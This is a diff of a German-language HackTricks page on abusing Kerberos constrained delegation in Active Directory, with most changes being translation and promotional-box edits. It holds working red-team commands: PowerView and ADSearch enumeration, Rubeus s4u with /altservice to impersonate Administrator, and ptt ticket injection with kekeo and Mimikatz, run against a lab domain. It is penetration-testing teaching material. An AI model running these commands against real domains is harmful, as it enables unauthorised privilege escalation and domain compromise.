@@ -1,35 +1,36 @@
 # Eingeschränkte Delegation
 
+{% hint style="success" %}
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary>Lernen Sie das Hacken von AWS von Grund auf mit <a href="https://training.hacktricks.xyz/courses/arte">htARTE (HackTricks AWS Red Team Expert)</a>!</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-Andere Möglichkeiten, HackTricks zu unterstützen:
-
-- Wenn Sie Ihr Unternehmen in HackTricks bewerben möchten oder HackTricks als PDF herunterladen möchten, überprüfen Sie die [ABONNEMENTPLÄNE](https://github.com/sponsors/carlospolop)!
-- Holen Sie sich das offizielle PEASS & HackTricks-Merchandise
-- Entdecken Sie die PEASS-Familie, unsere Sammlung exklusiver NFTs
-- Treten Sie der Discord-Gruppe oder der Telegram-Gruppe bei oder folgen Sie uns auf Twitter
-- Teilen Sie Ihre Hacking-Tricks, indem Sie PRs zu den HackTricks- und HackTricks Cloud-GitHub-Repositories einreichen
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
+{% endhint %}
 
 ## Eingeschränkte Delegation
 
-Mit dieser Methode kann ein Domänenadministrator einem Computer erlauben, sich als Benutzer oder Computer gegenüber einem Dienst auf einer Maschine auszugeben.
+Mit dieser Methode kann ein Domänenadministrator einem Computer **erlauben**, einen **Benutzer oder Computer** gegenüber einem **Dienst** einer Maschine **zu impersonieren**.
 
-- **Dienst für Benutzer selbst (S4U2self):** Wenn ein Dienstbenutzerkonto einen _userAccountControl_-Wert enthält, der [TRUSTED_TO_AUTH_FOR_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) (T2A4D) enthält, kann es ein TGS für sich selbst (den Dienst) im Namen eines anderen Benutzers erhalten.
-- **Dienst für Benutzer zum Proxy (S4U2proxy):** Ein Dienstbenutzerkonto kann ein TGS im Namen eines beliebigen Benutzers für den in **msDS-AllowedToDelegateTo** festgelegten Dienst erhalten. Dazu benötigt es zunächst ein TGS von diesem Benutzer für sich selbst, kann aber S4U2self verwenden, um dieses TGS zu erhalten, bevor es das andere anfordert.
+* **Dienst für Benutzer zu sich selbst (**_**S4U2self**_**):** Wenn ein **Dienstkonto** einen _userAccountControl_-Wert hat, der [TRUSTED\_TO\_AUTH\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) (T2A4D) enthält, kann es ein TGS für sich selbst (den Dienst) im Namen eines anderen Benutzers erhalten.
+* **Dienst für Benutzer zu Proxy(**_**S4U2proxy**_**):** Ein **Dienstkonto** könnte ein TGS im Namen eines Benutzers für den in **msDS-AllowedToDelegateTo** festgelegten Dienst erhalten. Dazu benötigt es zunächst ein TGS von diesem Benutzer zu sich selbst, kann jedoch S4U2self verwenden, um dieses TGS zu erhalten, bevor es das andere anfordert.
 
-**Hinweis**: Wenn ein Benutzer in AD als "_Account is sensitive and cannot be delegated_" markiert ist, können Sie ihn nicht imitieren.
+**Hinweis**: Wenn ein Benutzer in AD als ‘_Konto ist sensibel und kann nicht delegiert werden_’ markiert ist, können Sie **ihn nicht impersonieren**.
 
-Das bedeutet, dass Sie, wenn Sie den Hash des Dienstes kompromittieren, Benutzer imitieren und Zugriff in ihrem Namen auf den konfigurierten Dienst erhalten können (möglicher Privilege Escalation).
+Das bedeutet, dass Sie, wenn Sie **den Hash des Dienstes kompromittieren**, **Benutzer impersonieren** und **Zugriff** in ihrem Namen auf den **konfigurierten Dienst** erhalten können (mögliche **privesc**).
 
-Darüber hinaus haben Sie nicht nur Zugriff auf den Dienst, den der Benutzer imitieren kann, sondern auch auf jeden anderen Dienst, da der SPN (der angeforderte Dienstname) nicht überprüft wird, sondern nur die Berechtigungen. Wenn Sie also Zugriff auf den CIFS-Dienst haben, können Sie auch mit dem `/altservice`-Flag in Rubeus auf den HOST-Dienst zugreifen.
+Darüber hinaus haben Sie **nicht nur Zugriff auf den Dienst, den der Benutzer impersonieren kann, sondern auch auf jeden Dienst**, da der SPN (der angeforderte Dienstname) nicht überprüft wird, sondern nur die Berechtigungen. Daher können Sie, wenn Sie Zugriff auf den **CIFS-Dienst** haben, auch auf den **HOST-Dienst** zugreifen, indem Sie das `/altservice`-Flag in Rubeus verwenden.
 
-Auch der Zugriff auf den LDAP-Dienst auf einem DC ist erforderlich, um einen DCSync-Angriff auszuführen.
+Außerdem ist **Zugriff auf den LDAP-Dienst auf dem DC** erforderlich, um einen **DCSync** auszunutzen.
 
-{% code title="Enumerieren" %}
+{% code title="Auflisten" %}
 ```bash
 # Powerview
 Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
@@ -38,6 +39,8 @@ Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowed
 #ADSearch
 ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
 ```
+{% endcode %}
+
 {% code title="TGT abrufen" %}
 ```bash
 # The first step is to get a TGT of the service that can impersonate others
@@ -60,12 +63,12 @@ tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140
 {% endcode %}
 
 {% hint style="warning" %}
-Es gibt **andere Möglichkeiten, ein TGT-Ticket** oder **RC4** oder **AES256** zu erhalten, ohne SYSTEM auf dem Computer zu sein, wie den Drucker-Bug und die Delegation ohne Einschränkung, NTLM-Weiterleitung und den Missbrauch des Active Directory-Zertifikatdienstes.
+Es gibt **andere Möglichkeiten, ein TGT-Ticket** oder den **RC4** oder **AES256** zu erhalten, ohne SYSTEM auf dem Computer zu sein, wie den Printer Bug und unbeschränkte Delegation, NTLM-Relaying und den Missbrauch des Active Directory-Zertifizierungsdienstes.
 
-**Wenn Sie nur dieses TGT-Ticket (oder den gehashten Wert) haben, können Sie diesen Angriff durchführen, ohne den gesamten Computer zu kompromittieren.**
+**Mit diesem TGT-Ticket (oder dem Hash) können Sie diesen Angriff durchführen, ohne den gesamten Computer zu kompromittieren.**
 {% endhint %}
 
-{% code title="Mit Rubeus" %}
+{% code title="Using Rubeus" %}
 ```bash
 #Obtain a TGS of the Administrator user to self
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator
@@ -82,6 +85,8 @@ Es gibt **andere Möglichkeiten, ein TGT-Ticket** oder **RC4** oder **AES256** z
 #Load ticket in memory
 .\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
 ```
+{% endcode %}
+
 {% code title="kekeo + Mimikatz" %}
 ```bash
 #Obtain a TGT for the Constained allowed user
@@ -95,18 +100,19 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.
 ```
 {% endcode %}
 
-[**Weitere Informationen auf ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
+[**Mehr Informationen auf ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
+
+{% hint style="success" %}
+Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Unterstütze HackTricks</summary>
 
-Andere Möglichkeiten, HackTricks zu unterstützen:
-
-* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
-* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
+{% endhint %}
